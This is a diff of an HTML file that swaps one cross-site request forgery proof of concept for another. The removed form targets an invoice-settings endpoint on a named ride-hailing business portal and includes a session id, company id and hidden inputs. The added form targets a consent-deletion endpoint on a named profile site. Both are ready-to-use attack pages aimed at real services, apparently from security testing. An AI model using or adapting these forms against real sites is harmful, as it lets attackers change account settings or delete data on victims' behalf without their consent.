@@ -1,11 +1,13 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <h2>CSRF PoC: Update Company Invoice Splitting Settings</h2>
-    <form action="https://node.bolt.eu/business-portal/businessPortal/updateCompanyInvoiceSplittingSettings?version=BP.21.59&session_id=780338b1749278750&company_id=759452" method="POST">
-      <input type="hidden" name="business_company_id" value="759452">
-      <input type="hidden" name="split_invoice_by_business_group" value="1">
-      <button type="submit">Submit CSRF Request</button>
-    </form>
-  </body>
+<head>
+  <title>CSRF PoC</title>
+</head>
+<body>
+  <h1>CSRF PoC</h1>
+  <form action="https://profil.monxtra.be/manage-profile/food-preferences/consents/delete?_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2Fconsents.delete%2Findex" method="POST">
+    <!-- Include hidden inputs if necessary (e.g., CSRF tokens or expected parameters) -->
+    <input type="submit" value="Submit CSRF Request">
+  </form>
+</body>
 </html>
